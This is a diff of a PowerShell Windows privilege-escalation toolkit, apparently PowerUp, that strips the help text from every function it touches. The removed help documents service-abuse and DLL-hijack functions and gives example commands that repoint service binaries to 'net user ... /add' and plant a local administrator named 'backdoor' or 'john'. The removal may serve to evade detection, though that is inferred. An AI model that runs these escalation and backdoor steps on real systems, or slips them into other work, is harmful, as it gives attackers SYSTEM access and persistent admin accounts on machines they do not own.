@@ -1,31 +1,5 @@
 function New-InMemoryModule
 {
-<#
-.SYNOPSIS
-
-Creates an in-memory assembly and module
-
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
-
-.DESCRIPTION
-
-When defining custom enums, structs, and unmanaged functions, it is
-necessary to associate to an assembly module. This helper function
-creates an in-memory module that can be passed to the 'enum',
-'struct', and Add-Win32Type functions.
-
-.PARAMETER ModuleName
-
-Specifies the desired name for the in-memory assembly and module. If
-ModuleName is not provided, it will default to a GUID.
-
-.EXAMPLE
-
-$Module = New-InMemoryModule -ModuleName Win32
-#>
 
     Param
     (
@@ -108,98 +82,6 @@ function func
 
 function Add-Win32Type
 {
-<#
-.SYNOPSIS
-
-Creates a .NET type for an unmanaged Win32 function.
-
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: func
-
-.DESCRIPTION
-
-Add-Win32Type enables you to easily interact with unmanaged (i.e.
-Win32 unmanaged) functions in PowerShell. After providing
-Add-Win32Type with a function signature, a .NET type is created
-using reflection (i.e. csc.exe is never called like with Add-Type).
-
-The 'func' helper function can be used to reduce typing when defining
-multiple function definitions.
-
-.PARAMETER DllName
-
-The name of the DLL.
-
-.PARAMETER FunctionName
-
-The name of the target function.
-
-.PARAMETER EntryPoint
-
-The DLL export function name. This argument should be specified if the
-specified function name is different than the name of the exported
-function.
-
-.PARAMETER ReturnType
-
-The return type of the function.
-
-.PARAMETER ParameterTypes
-
-The function parameters.
-
-.PARAMETER NativeCallingConvention
-
-Specifies the native calling convention of the function. Defaults to
-stdcall.
-
-.PARAMETER Charset
-
-If you need to explicitly call an 'A' or 'W' Win32 function, you can
-specify the character set.
-
-.PARAMETER SetLastError
-
-Indicates whether the callee calls the SetLastError Win32 API
-function before returning from the attributed method.
-
-.PARAMETER Module
-
-The in-memory module that will host the functions. Use
-New-InMemoryModule to define an in-memory module.
-
-.PARAMETER Namespace
-
-An optional namespace to prepend to the type. Add-Win32Type defaults
-to a namespace consisting only of the name of the DLL.
-
-.EXAMPLE
-
-$Mod = New-InMemoryModule -ModuleName Win32
-
-$FunctionDefinitions = @(
-  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
-  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
-  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
-)
-
-$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
-$Kernel32 = $Types['kernel32']
-$Ntdll = $Types['ntdll']
-$Ntdll::RtlGetCurrentPeb()
-$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
-$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')
-
-.NOTES
-
-Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189
-
-When defining multiple function prototypes, it is ideal to provide
-Add-Win32Type with an array of function signatures. That way, they
-are all incorporated into the same in-memory module.
-#>
 
     [OutputType([Hashtable])]
     Param(
@@ -344,70 +226,6 @@ are all incorporated into the same in-memory module.
 
 function psenum
 {
-<#
-.SYNOPSIS
-
-Creates an in-memory enumeration for use in your PowerShell session.
-
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
-
-.DESCRIPTION
-
-The 'psenum' function facilitates the creation of enums entirely in
-memory using as close to a "C style" as PowerShell will allow.
-
-.PARAMETER Module
-
-The in-memory module that will host the enum. Use
-New-InMemoryModule to define an in-memory module.
-
-.PARAMETER FullName
-
-The fully-qualified name of the enum.
-
-.PARAMETER Type
-
-The type of each enum element.
-
-.PARAMETER EnumElements
-
-A hashtable of enum elements.
-
-.PARAMETER Bitfield
-
-Specifies that the enum should be treated as a bitfield.
-
-.EXAMPLE
-
-$Mod = New-InMemoryModule -ModuleName Win32
-
-$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
-    UNKNOWN =                  0
-    NATIVE =                   1 # Image doesn't require a subsystem.
-    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
-    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
-    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
-    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
-    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
-    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
-    EFI_APPLICATION =          10
-    EFI_BOOT_SERVICE_DRIVER =  11
-    EFI_RUNTIME_DRIVER =       12
-    EFI_ROM =                  13
-    XBOX =                     14
-    WINDOWS_BOOT_APPLICATION = 16
-}
-
-.NOTES
-
-PowerShell purists may disagree with the naming of this function but
-again, this was developed in such a way so as to emulate a "C style"
-definition as closely as possible. Sorry, I'm not going to name it
-New-Enum. :P
-#>
 
     [OutputType([Type])]
     Param
@@ -493,98 +311,6 @@ function field
 
 function struct
 {
-<#
-.SYNOPSIS
-
-Creates an in-memory struct for use in your PowerShell session.
-
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: field
-
-.DESCRIPTION
-
-The 'struct' function facilitates the creation of structs entirely in
-memory using as close to a "C style" as PowerShell will allow. Struct
-fields are specified using a hashtable where each field of the struct
-is comprosed of the order in which it should be defined, its .NET
-type, and optionally, its offset and special marshaling attributes.
-
-One of the features of 'struct' is that after your struct is defined,
-it will come with a built-in GetSize method as well as an explicit
-converter so that you can easily cast an IntPtr to the struct without
-relying upon calling SizeOf and/or PtrToStructure in the Marshal
-class.
-
-.PARAMETER Module
-
-The in-memory module that will host the struct. Use
-New-InMemoryModule to define an in-memory module.
-
-.PARAMETER FullName
-
-The fully-qualified name of the struct.
-
-.PARAMETER StructFields
-
-A hashtable of fields. Use the 'field' helper function to ease
-defining each field.
-
-.PARAMETER PackingSize
-
-Specifies the memory alignment of fields.
-
-.PARAMETER ExplicitLayout
-
-Indicates that an explicit offset for each field will be specified.
-
-.EXAMPLE
-
-$Mod = New-InMemoryModule -ModuleName Win32
-
-$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
-    DOS_SIGNATURE =    0x5A4D
-    OS2_SIGNATURE =    0x454E
-    OS2_SIGNATURE_LE = 0x454C
-    VXD_SIGNATURE =    0x454C
-}
-
-$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
-    e_magic =    field 0 $ImageDosSignature
-    e_cblp =     field 1 UInt16
-    e_cp =       field 2 UInt16
-    e_crlc =     field 3 UInt16
-    e_cparhdr =  field 4 UInt16
-    e_minalloc = field 5 UInt16
-    e_maxalloc = field 6 UInt16
-    e_ss =       field 7 UInt16
-    e_sp =       field 8 UInt16
-    e_csum =     field 9 UInt16
-    e_ip =       field 10 UInt16
-    e_cs =       field 11 UInt16
-    e_lfarlc =   field 12 UInt16
-    e_ovno =     field 13 UInt16
-    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
-    e_oemid =    field 15 UInt16
-    e_oeminfo =  field 16 UInt16
-    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
-    e_lfanew =   field 18 Int32
-}
-
-# Example of using an explicit layout in order to create a union.
-$TestUnion = struct $Mod TestUnion @{
-    field1 = field 0 UInt32 0
-    field2 = field 1 IntPtr 0
-} -ExplicitLayout
-
-.NOTES
-
-PowerShell purists may disagree with the naming of this function but
-again, this was developed in such a way so as to emulate a "C style"
-definition as closely as possible. Sorry, I'm not going to name it
-New-Struct. :P
-#>
 
     [OutputType([Type])]
     Param
@@ -719,52 +445,6 @@ New-Struct. :P
 ########################################################
 
 function Get-ModifiablePath {
-<#
-    .SYNOPSIS
-
-        Parses a passed string containing multiple possible file/folder paths and returns
-        the file paths where the current user has modification rights.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Takes a complex path specification of an initial file/folder path with possible
-        configuration files, 'tokenizes' the string in a number of possible ways, and
-        enumerates the ACLs for each path that currently exists on the system. Any path that
-        the current user has modification rights on is returned in a custom object that contains
-        the modifiable path, associated permission set, and the IdentityReference with the specified
-        rights. The SID of the current user and any group he/she are a part of are used as the
-        comparison set against the parsed path DACLs.
-
-    .PARAMETER Path
-
-        The string path to parse for modifiable files. Required
-
-    .PARAMETER LiteralPaths
-
-        Switch. Treat all paths as literal (i.e. don't do 'tokenization').
-
-    .EXAMPLE
-
-        PS C:\> '"C:\Temp\blah.exe" -f "C:\Temp\config.ini"' | Get-ModifiablePath
-
-        Path                       Permissions                IdentityReference
-        ----                       -----------                -----------------
-        C:\Temp\blah.exe           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
-        C:\Temp\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
-
-    .EXAMPLE
-
-        PS C:\> Get-ChildItem C:\Vuln\ -Recurse | Get-ModifiablePath
-
-        Path                       Permissions                IdentityReference
-        ----                       -----------                -----------------
-        C:\Vuln\blah.bat           {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
-        C:\Vuln\config.ini         {ReadAttributes, ReadCo... NT AUTHORITY\Authentic...
-        ...
-#>
 
     [CmdletBinding()]
     Param(
@@ -917,29 +597,6 @@ function Get-ModifiablePath {
 
 
 function Get-CurrentUserTokenGroupSid {
-<#
-    .SYNOPSIS
-
-        Returns all SIDs that the current user is a part of, whether they are disabled or not.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        First gets the current process handle using the GetCurrentProcess() Win32 API call and feeds
-        this to OpenProcessToken() to open up a handle to the current process token. The API call
-        GetTokenInformation() is then used to enumerate the TOKEN_GROUPS for the current process
-        token. Each group is iterated through and the SID structure is converted to a readable
-        string using ConvertSidToStringSid(), and the unique list of SIDs the user is a part of
-        (disabled or not) is returned as a string array.
-
-    .LINK
-
-        https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx
-        https://msdn.microsoft.com/en-us/library/windows/desktop/aa379624(v=vs.85).aspx
-        https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx
-#>
 
     [CmdletBinding()]
     Param()
@@ -994,45 +651,6 @@ function Get-CurrentUserTokenGroupSid {
 
 
 function Add-ServiceDacl {
-<#
-    .SYNOPSIS
-
-        Adds a Dacl field to a service object returned by Get-Service.
-
-        Author: Matthew Graeber (@mattifestation)
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
-        Dacl field to each object. It does this by opening a handle with ReadControl for the
-        service with using the GetServiceHandle Win32 API call and then uses
-        QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.
-
-    .PARAMETER Name
-
-        An array of one or more service names to add a service Dacl for. Passable on the pipeline.
-
-    .EXAMPLE
-
-        PS C:\> Get-Service | Add-ServiceDacl
-
-        Add Dacls for every service the current user can read.
-
-    .EXAMPLE
-
-        PS C:\> Get-Service -Name VMTools | Add-ServiceDacl
-
-        Add the Dacl to the VMTools service object.
-
-    .OUTPUTS
-
-        ServiceProcess.ServiceController
-
-    .LINK
-
-        https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
-#>
 
     [OutputType('ServiceProcess.ServiceController')]
     param (
@@ -1112,54 +730,6 @@ function Add-ServiceDacl {
 
 
 function Set-ServiceBinPath {
-<#
-    .SYNOPSIS
-
-        Sets the binary path for a service to a specified value.
-
-        Author: @harmj0y, Matthew Graeber (@mattifestation)
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Takes a service Name or a ServiceProcess.ServiceController on the pipeline and first opens up a
-        service handle to the service with ConfigControl access using the GetServiceHandle
-        Win32 API call. ChangeServiceConfig is then used to set the binary path (lpBinaryPathName/binPath)
-        to the string value specified by binPath, and the handle is closed off.
-
-        Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
-        Dacl field to each object. It does this by opening a handle with ReadControl for the
-        service with using the GetServiceHandle Win32 API call and then uses
-        QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.
-
-    .PARAMETER Name
-
-        An array of one or more service names to set the binary path for. Required.
-
-    .PARAMETER binPath
-
-        The new binary path (lpBinaryPathName) to set for the specified service. Required.
-
-    .OUTPUTS
-
-        $True if configuration succeeds, $False otherwise.
-
-    .EXAMPLE
-
-        PS C:\> Set-ServiceBinPath -Name VulnSvc -BinPath 'net user john Password123! /add'
-
-        Sets the binary path for 'VulnSvc' to be a command to add a user.
-
-    .EXAMPLE
-
-        PS C:\> Get-Service VulnSvc | Set-ServiceBinPath -BinPath 'net user john Password123! /add'
-
-        Sets the binary path for 'VulnSvc' to be a command to add a user.
-
-    .LINK
-
-        https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
-#>
 
     param (
         [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -1230,65 +800,6 @@ function Set-ServiceBinPath {
 
 
 function Test-ServiceDaclPermission {
-<#
-    .SYNOPSIS
-
-        Tests one or more passed services or service names against a given permission set,
-        returning the service objects where the current user have the specified permissions.
-
-        Author: @harmj0y, Matthew Graeber (@mattifestation)
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Takes a service Name or a ServiceProcess.ServiceController on the pipeline, and first adds
-        a service Dacl to the service object with Add-ServiceDacl. All group SIDs for the current
-        user are enumerated services where the user has some type of permission are filtered. The
-        services are then filtered against a specified set of permissions, and services where the
-        current user have the specified permissions are returned.
-
-    .PARAMETER Name
-
-        An array of one or more service names to test against the specified permission set.
-
-    .PARAMETER Permissions
-
-        A manual set of permission to test again. One of:'QueryConfig', 'ChangeConfig', 'QueryStatus',
-        'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', UserDefinedControl',
-        'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity',
-        'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess'
-
-    .PARAMETER PermissionSet
-
-        A pre-defined permission set to test a specified service against. 'ChangeConfig', 'Restart', or 'AllAccess'.
-
-    .OUTPUTS
-
-        ServiceProcess.ServiceController
-
-    .EXAMPLE
-
-        PS C:\> Get-Service | Test-ServiceDaclPermission
-
-        Return all service objects where the current user can modify the service configuration.
-
-    .EXAMPLE
-
-        PS C:\> Get-Service | Test-ServiceDaclPermission -PermissionSet 'Restart'
-
-        Return all service objects that the current user can restart.
-
-
-    .EXAMPLE
-
-        PS C:\> Test-ServiceDaclPermission -Permissions 'Start' -Name 'VulnSVC'
-
-        Return the VulnSVC object if the current user has start permissions.
-
-    .LINK
-
-        https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/
-#>
 
     [OutputType('ServiceProcess.ServiceController')]
     param (
@@ -1408,22 +919,7 @@ function Test-ServiceDaclPermission {
 ########################################################
 
 function Get-ServiceUnquoted {
-<#
-    .SYNOPSIS
 
-        Returns the name and binary path for services with unquoted paths
-        that also have a space in the name.
-
-    .EXAMPLE
-
-        PS C:\> $services = Get-ServiceUnquoted
-
-        Get a set of potentially exploitable services.
-
-    .LINK
-
-        https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/trusted_service_path.rb
-#>
     [CmdletBinding()] param()
 
     # find all paths to service .exe's that have a space in the path and aren't quoted
@@ -1459,25 +955,7 @@ function Get-ServiceUnquoted {
 
 
 function Get-ModifiableServiceFile {
-<#
-    .SYNOPSIS
 
-        Enumerates all services and returns vulnerable service files.
-
-    .DESCRIPTION
-
-        Enumerates all services by querying the WMI win32_service class. For each service,
-        it takes the pathname (aka binPath) and passes it to Get-ModifiablePath to determine
-        if the current user has rights to modify the service binary itself or any associated
-        arguments. If the associated binary (or any configuration files) can be overwritten,
-        privileges may be able to be escalated.
-
-    .EXAMPLE
-
-        PS C:\> Get-ModifiableServiceFile
-
-        Get a set of potentially exploitable service binares/config files.
-#>
     [CmdletBinding()] param()
 
     Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathname} | ForEach-Object {
@@ -1513,22 +991,7 @@ function Get-ModifiableServiceFile {
 
 
 function Get-ModifiableService {
-<#
-    .SYNOPSIS
 
-        Enumerates all services and returns services for which the current user can modify the binPath.
-
-    .DESCRIPTION
-
-        Enumerates all services using Get-Service and uses Test-ServiceDaclPermission to test if
-        the current user has rights to change the service configuration.
-
-    .EXAMPLE
-
-        PS C:\> Get-ModifiableService
-
-        Get a set of potentially exploitable services.
-#>
     [CmdletBinding()] param()
 
     Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConfig' | ForEach-Object {
@@ -1556,35 +1019,6 @@ function Get-ModifiableService {
 
 
 function Get-ServiceDetail {
-<#
-    .SYNOPSIS
-
-        Returns detailed information about a specified service by querying the
-        WMI win32_service class for the specified service name.
-
-    .DESCRIPTION
-
-        Takes an array of one or more service Names or ServiceProcess.ServiceController objedts on
-        the pipeline object returned by Get-Service, extracts out the service name, queries the
-        WMI win32_service class for the specified service for details like binPath, and outputs
-        everything.
-
-    .PARAMETER Name
-
-        An array of one or more service names to query information for.
-
-    .EXAMPLE
-
-        PS C:\> Get-ServiceDetail -Name VulnSVC
-
-        Gets detailed information about the 'VulnSVC' service.
-
-    .EXAMPLE
-
-        PS C:\> Get-Service VulnSVC | Get-ServiceDetail
-
-        Gets detailed information about the 'VulnSVC' service.
-#>
 
     param (
         [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -1621,89 +1055,6 @@ function Get-ServiceDetail {
 ########################################################
 
 function Invoke-ServiceAbuse {
-<#
-    .SYNOPSIS
-
-        Abuses a function the current user has configuration rights on in order
-        to add a local administrator or execute a custom command.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Takes a service Name or a ServiceProcess.ServiceController on the pipeline that the current
-        user has configuration modification rights on and executes a series of automated actions to
-        execute commands as SYSTEM. First, the service is enabled if it was set as disabled and the
-        original service binary path and configuration state are preserved. Then the service is stopped
-        and the Set-ServiceBinPath function is used to set the binary (binPath) for the service to a
-        series of commands, the service is started, stopped, and the next command is configured. After
-        completion, the original service configuration is restored and a custom object is returned
-        that captures the service abused and commands run.
-
-    .PARAMETER Name
-
-        An array of one or more service names to abuse.
-
-    .PARAMETER UserName
-
-        The [domain\]username to add. If not given, it defaults to "john".
-        Domain users are not created, only added to the specified localgroup.
-
-    .PARAMETER Password
-
-        The password to set for the added user. If not given, it defaults to "Password123!"
-
-    .PARAMETER LocalGroup
-
-        Local group name to add the user to (default of 'Administrators').
-
-    .PARAMETER Credential
-
-        A [Management.Automation.PSCredential] object specifying the user/password to add.
-
-    .PARAMETER Command
-
-        Custom command to execute instead of user creation.
-
-    .PARAMETER Force
-
-        Switch. Force service stopping, even if other services are dependent.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceAbuse -Name VulnSVC
-
-        Abuses service 'VulnSVC' to add a localuser "john" with password
-        "Password123! to the  machine and local administrator group
-
-    .EXAMPLE
-
-        PS C:\> Get-Service VulnSVC | Invoke-ServiceAbuse
-
-        Abuses service 'VulnSVC' to add a localuser "john" with password
-        "Password123! to the  machine and local administrator group
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceAbuse -Name VulnSVC -UserName "TESTLAB\john"
-
-        Abuses service 'VulnSVC' to add a the domain user TESTLAB\john to the
-        local adminisrtators group.
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceAbuse -Name VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
-
-        Abuses service 'VulnSVC' to add a localuser "backdoor" with password
-        "password" to the  machine and local "Power Users" group
-
-    .EXAMPLE
-
-        PS C:\> Invoke-ServiceAbuse -Name VulnSVC -Command "net ..."
-
-        Abuses service 'VulnSVC' to execute a custom command.
-#>
 
     param (
         [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -1845,89 +1196,6 @@ function Invoke-ServiceAbuse {
 
 
 function Write-ServiceBinary {
-<#
-    .SYNOPSIS
-
-        Patches in the specified command to a pre-compiled C# service executable and
-        writes the binary out to the specified ServicePath location.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Takes a pre-compiled C# service binary and patches in the appropriate commands needed
-        for service abuse. If a -UserName/-Password or -Credential is specified, the command
-        patched in creates a local user and adds them to the specified -LocalGroup, otherwise
-        the specified -Command is patched in. The binary is then written out to the specified
-        -ServicePath. Either -Name must be specified for the service, or a proper object from
-        Get-Service must be passed on the pipeline in order to patch in the appropriate service
-        name the binary will be running under.
-
-    .PARAMETER Name
-
-        The service name the EXE will be running under.
-
-    .PARAMETER UserName
-
-        The [domain\]username to add. If not given, it defaults to "john".
-        Domain users are not created, only added to the specified localgroup.
-
-    .PARAMETER Password
-
-        The password to set for the added user. If not given, it defaults to "Password123!"
-
-    .PARAMETER LocalGroup
-
-        Local group name to add the user to (default of 'Administrators').
-
-    .PARAMETER Credential
-
-        A [Management.Automation.PSCredential] object specifying the user/password to add.
-
-    .PARAMETER Command
-
-        Custom command to execute instead of user creation.
-
-    .PARAMETER Path
-
-        Path to write the binary out to, defaults to 'service.exe' in the local directory.
-
-    .EXAMPLE
-
-        PS C:\> Write-ServiceBinary -Name VulnSVC
-
-        Writes a service binary to service.exe in the local directory for VulnSVC that
-        adds a local Administrator (john/Password123!).
-
-    .EXAMPLE
-
-        PS C:\> Get-Service VulnSVC | Write-ServiceBinary
-
-        Writes a service binary to service.exe in the local directory for VulnSVC that
-        adds a local Administrator (john/Password123!).
-
-    .EXAMPLE
-
-        PS C:\> Write-ServiceBinary -Name VulnSVC -UserName 'TESTLAB\john'
-
-        Writes a service binary to service.exe in the local directory for VulnSVC that adds
-        TESTLAB\john to the Administrators local group.
-
-    .EXAMPLE
-
-        PS C:\> Write-ServiceBinary -Name VulnSVC -UserName backdoor -Password Password123!
-
-        Writes a service binary to service.exe in the local directory for VulnSVC that
-        adds a local Administrator (backdoor/Password123!).
-
-    .EXAMPLE
-
-        PS C:\> Write-ServiceBinary -Name VulnSVC -Command "net ..."
-
-        Writes a service binary to service.exe in the local directory for VulnSVC that
-        executes a custom command.
-#>
 
     Param(
         [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -2016,85 +1284,6 @@ function Write-ServiceBinary {
 
 
 function Install-ServiceBinary {
-<#
-    .SYNOPSIS
-
-        Replaces the service binary for the specified service with one that executes
-        a specified command as SYSTEM.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Takes a esrvice Name or a ServiceProcess.ServiceController on the pipeline where the
-        current user can  modify the associated service binary listed in the binPath. Backs up
-        the original service binary to "OriginalService.exe.bak" in service binary location,
-        and then uses Write-ServiceBinary to create a C# service binary that either adds
-        a local administrator user or executes a custom command. The new service binary is
-        replaced in the original service binary path, and a custom object is returned that
-        captures the original and new service binary configuration.
-
-    .PARAMETER Name
-
-        The service name the EXE will be running under.
-
-    .PARAMETER UserName
-
-        The [domain\]username to add. If not given, it defaults to "john".
-        Domain users are not created, only added to the specified localgroup.
-
-    .PARAMETER Password
-
-        The password to set for the added user. If not given, it defaults to "Password123!"
-
-    .PARAMETER LocalGroup
-
-        Local group name to add the user to (default of 'Administrators').
-
-    .PARAMETER Credential
-
-        A [Management.Automation.PSCredential] object specifying the user/password to add.
-
-    .PARAMETER Command
-
-        Custom command to execute instead of user creation.
-
-    .EXAMPLE
-
-        PS C:\> Install-ServiceBinary -Name VulnSVC
-
-        Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
-        for VulnSVC with one that adds a local Administrator (john/Password123!).
-
-    .EXAMPLE
-
-        PS C:\> Get-Service VulnSVC | Install-ServiceBinary
-
-        Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
-        for VulnSVC with one that adds a local Administrator (john/Password123!).
-
-    .EXAMPLE
-
-        PS C:\> Install-ServiceBinary -Name VulnSVC -UserName 'TESTLAB\john'
-
-        Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
-        for VulnSVC with one that adds TESTLAB\john to the Administrators local group.
-
-    .EXAMPLE
-
-        PS C:\> Install-ServiceBinary -Name VulnSVC -UserName backdoor -Password Password123!
-
-        Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
-        for VulnSVC with one that adds a local Administrator (backdoor/Password123!).
-
-    .EXAMPLE
-
-        PS C:\> Install-ServiceBinary -Name VulnSVC -Command "net ..."
-
-        Backs up the original service binary to SERVICE_PATH.exe.bak and replaces the binary
-        for VulnSVC with one that executes a custom command.
-#>
 
     Param(
         [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -2177,44 +1366,6 @@ function Install-ServiceBinary {
 
 
 function Restore-ServiceBinary {
-<#
-    .SYNOPSIS
-
-        Restores a service binary backed up by Install-ServiceBinary.
-
-    .DESCRIPTION
-
-        Takes a service Name or a ServiceProcess.ServiceController on the pipeline and
-        checks for the existence of an "OriginalServiceBinary.exe.bak" in the service
-        binary location. If it exists, the backup binary is restored to the original
-        binary path.
-
-    .PARAMETER Name
-
-        The service name to restore a binary for.
-
-    .PARAMETER BackupPath
-
-        Optional manual path to the backup binary.
-
-    .EXAMPLE
-
-        PS C:\> Restore-ServiceBinary -Name VulnSVC
-
-        Restore the original binary for the service 'VulnSVC'.
-
-    .EXAMPLE
-
-        PS C:\> Get-Service VulnSVC | Restore-ServiceBinary
-
-        Restore the original binary for the service 'VulnSVC'.
-
-    .EXAMPLE
-
-        PS C:\> Restore-ServiceBinary -Name VulnSVC -BackupPath 'C:\temp\backup.exe'
-
-        Restore the original binary for the service 'VulnSVC' from a custom location.
-#>
 
     Param(
         [Parameter(Position=0, Mandatory=$True, ValueFromPipeline=$True, ValueFromPipelineByPropertyName=$True)]
@@ -2263,67 +1414,6 @@ function Restore-ServiceBinary {
 ########################################################
 
 function Find-ProcessDLLHijack {
-<#
-    .SYNOPSIS
-
-        Finds all DLL hijack locations for currently running processes.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Enumerates all currently running processes with Get-Process (or accepts an
-        input process object from Get-Process) and enumerates the loaded modules for each.
-        All loaded module name exists outside of the process binary base path, as those
-        are DLL load-order hijack candidates.
-
-    .PARAMETER Name
-
-        The name of a process to enumerate for possible DLL path hijack opportunities.
-
-    .PARAMETER ExcludeWindows
-
-        Exclude paths from C:\Windows\* instead of just C:\Windows\System32\*
-
-    .PARAMETER ExcludeProgramFiles
-
-        Exclude paths from C:\Program Files\* and C:\Program Files (x86)\*
-
-    .PARAMETER ExcludeOwned
-
-        Exclude processes the current user owns.
-
-    .EXAMPLE
-
-        PS C:\> Find-ProcessDLLHijack
-
-        Finds possible hijackable DLL locations for all processes.
-
-    .EXAMPLE
-
-        PS C:\> Get-Process VulnProcess | Find-ProcessDLLHijack
-
-        Finds possible hijackable DLL locations for the 'VulnProcess' processes.
-
-    .EXAMPLE
-
-        PS C:\> Find-ProcessDLLHijack -ExcludeWindows -ExcludeProgramFiles
-
-        Finds possible hijackable DLL locations not in C:\Windows\* and
-        not in C:\Program Files\* or C:\Program Files (x86)\*
-
-    .EXAMPLE
-
-        PS C:\> Find-ProcessDLLHijack -ExcludeOwned
-
-        Finds possible hijackable DLL location for processes not owned by the
-        current user.
-
-    .LINK
-
-        https://www.mandiant.com/blog/malware-persistence-windows-registry/
-#>
 
     [CmdletBinding()]
     Param(
@@ -2412,31 +1502,6 @@ function Find-ProcessDLLHijack {
 
 
 function Find-PathDLLHijack {
-<#
-    .SYNOPSIS
-
-        Finds all directories in the system %PATH% that are modifiable by the current user.
-
-        Author: @harmj0y
-        License: BSD 3-Clause
-
-    .DESCRIPTION
-
-        Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath
-        to return the folder paths the current user can write to. On Windows 7, if wlbsctrl.dll is
-        written to one of these paths, execution for the IKEEXT can be hijacked due to DLL search
-        order loading.
-
-    .EXAMPLE
-
-        PS C:\> Find-PathDLLHijack
-
-        Finds all %PATH% .DLL hijacking opportunities.
-
-    .LINK
-
-        http://www.greyhathacker.net/?p=738
-#>
 
     [CmdletBinding()]
     Param()
@@ -2457,54 +1522,6 @@ function Find-PathDLLHijack {
 
 
 function Write-HijackDll {
-<#
-    .SYNOPSIS
-
-        Patches in the path to a specified .bat (containing the specified command) into a
-        pre-compiled hijackable C++ DLL writes the DLL out to the specified ServicePath location.
-
-    .DESCRIPTION
-
-        First builds a self-deleting .bat file that executes the specified -Command or local user,
-        to add and writes the.bat out to -BatPath. The BatPath is then patched into a pre-compiled
-        C++ DLL that is built to be hijackable by the IKEEXT service. There are two DLLs, one for
-        x86 and one for x64, and both are contained as base64-encoded strings. The DLL is then
-        written out to the specified OutputFile.
-
-    .PARAMETER DllPath
-
-        File name to write the generated DLL out to.
-
-    .PARAMETER Architecture
-
-        The Architecture to generate for the DLL, x86 or x64. If not specified, ChkUp
-        will try to automatically determine the correct architecture.
-
-    .PARAMETER BatPath
-
-        Path to the .bat for the DLL to launch.
-
-    .PARAMETER UserName
-
-        The [domain\]username to add. If not given, it defaults to "john".
-        Domain users are not created, only added to the specified localgroup.
-
-    .PARAMETER Password
-
-        The password to set for the added user. If not given, it defaults to "Password123!"
-
-    .PARAMETER LocalGroup
-
-        Local group name to add the user to (default of 'Administrators').
-
-    .PARAMETER Credential
-
-        A [Management.Automation.PSCredential] object specifying the user/password to add.
-
